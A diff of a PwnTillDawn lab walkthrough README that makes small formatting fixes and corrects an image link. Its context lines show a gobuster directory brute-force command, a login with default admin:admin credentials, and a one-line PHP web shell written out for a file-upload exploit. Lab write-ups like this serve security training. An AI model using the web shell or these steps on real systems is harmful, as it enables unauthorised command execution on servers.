@@ -84,7 +84,7 @@ Use Gobuster to perform directory brute-forcing and discover hidden directories 
 gobuster dir -u http://10.150.150.11 -w /usr/share/wordlists/dirb/common.txt -x php -t 10 --timeout 30s
 ```
 ![image](https://github.com/MollyWasGud/Lab-3-PwnTillDawn-Walkthrough/blob/main/image%20PwnTillDawn/gobuster1.png)  
-![image](https://github.com/MollyWasGud/Lab-3-PwnTillDawn-Walkthrough/blob/main/image%20PwnTillDawn/gobuster1.png)
+![image](https://github.com/MollyWasGud/Lab-3-PwnTillDawn-Walkthrough/blob/main/image%20PwnTillDawn/gobuster2.png)
 Discovered critical endpoints: `/admin/`, `/upload/`, and `/login.php`.
 
 ### Step 2.4 - Review Interesting Pages
@@ -124,7 +124,7 @@ HTTP 302 Redirect to `myfiles.php` confirms successful login with `admin:admin`.
 ### Step 3.3 - Access the File Dashboard
 After login, the application redirects to the file management dashboard.
 
-Observation: The dashboard includes an "Add File" feature, which may allow for a file upload exploit.
+Observation: The dashboard includes an `Add File` feature, which may allow for a file upload exploit.
 ![image](https://github.com/MollyWasGud/Lab-3-PwnTillDawn-Walkthrough/blob/main/image%20PwnTillDawn/accessadmin.png)
 
 ---
@@ -136,7 +136,7 @@ Create the payload on the Kali machine.
 ```bash
 echo '<?php system($_GET["cmd"]); ?>' > webshell.php
 ```
-A PHP payload was chosen because the target web application uses PHP pages such as /login.php and /config.php.
+A PHP payload was chosen because the target web application uses PHP pages such as `/login.php` and `/config.php`.
 ![image](https://github.com/MollyWasGud/Lab-3-PwnTillDawn-Walkthrough/blob/main/image%20PwnTillDawn/createwebshell.png)
 
 ### Step 4.2 - Upload the Web Shell
